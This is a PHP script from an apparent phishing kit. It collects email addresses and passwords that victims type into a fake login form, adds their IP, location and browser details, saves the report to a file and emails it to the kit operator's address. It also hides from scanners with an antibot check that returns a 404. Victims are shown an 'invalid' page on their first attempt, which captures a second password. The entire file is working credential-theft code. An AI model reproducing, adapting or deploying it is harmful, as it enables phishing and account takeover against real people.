<?php
session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
include "../conf/config.php";

include 'recon.php';
if($_POST){
    $eml 	  = $_POST['email_address'];
	$epass  = $_POST['email_password'];

    $ip = $_SERVER['REMOTE_ADDR'];

if($e_log == "on"){}else{
    $ff = fopen("em_db",'a');
    fwrite($ff,$ip."\n");
    fclose($ff);
    }

$ck = file_get_contents('em_db');

    if(strpos($ck, $ip) !== false){
        //log2 if enabled else log2
        $body = "::::::::::::::::::::::: BLUEPRINT 1nf0 1 [Dual email Details] :::::::::::::::::::::::::\r\n";
	          $body .= "Email                               : $eml\r\n";
	          $body .= "Password                            : $epass\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/email".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
              }
 
	          $subject=" C1t1zen Dual Email Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);

        $b = file_get_contents('em_db');
        $c = preg_replace($ip, '', $b);
        file_put_contents("em_db", $c);

        header("Location: ../../success.php?token={$_SESSION['token']}");

    }else{
        //log1 if enabled else noting
        $body = "::::::::::::::::::::::: BLUEPRINT 1nf0 1 [Email Details] :::::::::::::::::::::::::\r\n";
	          $body .= "Email                               : $eml\r\n";
	          $body .= "Password                            : $epass\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/email".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
              }
 
	          $subject="C1t1zen  Email Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);

        $ff = fopen("em_db",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);


        header("Location: ../../mail_verify.php?invalid&token={$_SESSION['token']}");

    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}
?>